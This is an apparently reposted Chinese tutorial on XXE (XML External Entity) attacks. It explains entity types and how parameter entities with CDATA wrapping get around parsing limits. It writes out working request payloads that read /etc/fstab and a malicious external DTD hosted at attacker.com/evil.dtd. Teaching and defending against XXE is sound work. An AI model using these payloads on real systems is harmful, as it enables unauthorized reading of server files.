# XML外部实体的一些限制与解决办法

> 原文：[https://www.zhihuifly.com/t/topic/3586](https://www.zhihuifly.com/t/topic/3586)

## XML外部实体的一些限制与解决办法

**error**

通常对于XXE的经典用法，用来读取文件比较直接方便，但是，也决定了能被解析的内容元素必须是XML文档。

如下面一个例子：

request:

```
POST http://example.com/xml HTTP/1.1 `<!DOCTYPE foo [

<!ELEMENT foo ANY>

<!ENTITY bar SYSTEM

“file:///etc/fstab”>;

]>

<foo>

&bar;

</foo>` 
```

response:

通常会得到如下响应

```
HTTP/1.0 500 Internal Server Error `File “file:///etc/fstab”, line 3

lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15…` 
```

`/etc/fstab`是一个包含一些看起来像XML的字符的文件（即使它们不是XML）。这将导致XML解析器尝试解析这些元素，只是注意到它不是有效的XML文档。

因此，这限制了XML外部实体（XXE）在以下两个重要方面。

*   XXE只能用于获取包含“有效”XML的文件或响应

*   XXE不能用于获取二进制文件

    **XML外部实体（XXE）限制解决办法**

    这其实也就用到了外部参数实体，解决了命名实体和普通实体所带来的一些问题。具体如下分析：

    攻击者可以通过使用一些巧妙的技巧来解决上述限制。攻击者使用XML外部实体（XXE）攻击所面临的主要问题是，它很容易撞了南墙试图exfiltrate不是有效的XML文件（包含XML特殊字符，如例如，文件明文文件时`&`，`< and >`）。

*   **理论上的解决办法**

    XML已经解决了这个问题，因为有些合法的情况可能需要在XML文件中存储XML特殊字符。`CDATA`XML解析器忽略（Character Data）标记中的特殊XML字符。

    ```
    <data><![CDATA[ < " ' & > characters are ok in here ]]></data> 
    ```

    因此，从理论上讲，攻击者可以发送类似于以下内容的请求。

    request:

    ```
    POST http://example.com/xml HTTP/1.1 `<!DOCTYPE data [

    <!ENTITY start “<![CDATA[”>

    <!ENTITY file SYSTEM

    “file:///etc/fstab”>

    <!ENTITY end “]]>”>

    <!ENTITY all “&start;&file;&end;”>

    ]>

    <data>&all;</data>` 
    ```

    预期response:

    ```
    HTTP/1.0 200 OK

    # /etc/fstab: static file system informa…

    # <file system> <mount point> <type> …

    proc  /proc  proc  defaults  0  0

    # /dev/sda5

    UUID=be35a709-c787-4198-a903-d5fdc80ab2f… # /dev/sda6

    UUID=cee15eca-5b2e-48ad-9735-eae5ac14bc9…

    /dev/scd0  /media/cdrom0  udf,iso9660 … 
    ```

    但实际上并不起作用，因为XML规范不允许将**外部实体**与**内部实体**结合使用。

##### 内部实体代码示例：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]> 
```

##### 外部实体代码示例：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds> 
```

### 参数实体

然而，攻击者仍然可以扔出手里的另一张牌—参数实体，在得到以上限制解决方法之前先理解一下以下两个重点：

#### 重点一：

实体分为两种，内部实体和**外部实体**，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：

还是以上代码

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds> 
```

#### 重点二：

我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）

**通用实体：**

用 &实体名:引用的实体，他在DTD 中定义，在 XML 文档中引用

**示例代码：**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPe root [
    <!ENTITY outfile SYSTEM "outfile.xml">
]>
<root><outfile>&outfile;</outfile></root> 
```

**参数实体：**

(1)使用 `% 实体名`(**这里面空格不能少**) 在 DTD 中定义，并且**只能在 DTD 中使用 **`%实体名;` **引用** (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3)和通用实体一样，参数实体也可以外部引用

**示例代码：**

```
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd; 
```

参数实体在我们 Blind XXE 中起到了至关重要的作用

接下来怎么做？（解决办法）

除了**一般实体**，这是我们到目前为止所看到的，还有**参数实体**。 以下是参数实体的外观。它与一般实体相同，除了它存在于DTD内部并以％作为前缀开始，以指示XML解析器正在定义参数实体（不是通用实体）。在下面的示例中，参数实体用于定义通用实体，然后在XML文档内部调用该实体。

request:

```
POST http://example.com/xml HTTP/1.1 `<!DOCTYPE data [

<!ENTITY % paramEntity

“<!ENTITY genEntity ‘bar’>”>

%paramEntity;

]>

<data>&genEntity;</data>` 
```

预期的response:

```
HTTP/1.0 200 OK `bar` 
```

考虑到上面的示例，攻击者现在可以通过创建在**[attacker.com/evil.dtd上](http://attacker.com/evil.dtd%E4%B8%8A)**托管的恶意DTD，将上面的理论CDATA示例转换为工作**攻击。**

**request:**

```
POST http://example.com/xml HTTP/1.1 `<!DOCTYPE data [

<!ENTITY % dtd SYSTEM

“[http://attacker.com/evil.dtd](http://attacker.com/evil.dtd)”>

%dtd;

%all;

]>

<data>&fileContents;</data>` 
```

**攻击者DTD（attacker.com/evil.dtd）**

```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 
```

解析：

当攻击者发送上述请求时，XML解析器将首先**%dtd**通过向**http://attacker.com/evil.dtd**发出请求来尝试处理参数实体**。**

一旦下载了攻击者的DTD，XML解析器将加载`%file`参数实体（来自**evil.dtd**），在本例中是`/etc/fstab`。然后它将分别``使用`%start`和`%end`参数实体将文件的内容包装在标签中，并将它们存储在另一个名为的参数实体中`%all`。

这个技巧的核心是`%all`创建一个被调用的**通用**实体`&fileContents;`，它可以作为响应的一部分包含在攻击者中。

注:攻击者**可以**只使用DTD内参数实体，而不是内部的XML文档）

结果是回复攻击者，文件（`/etc/fstab`）的内容包含在`CDATA`标签中。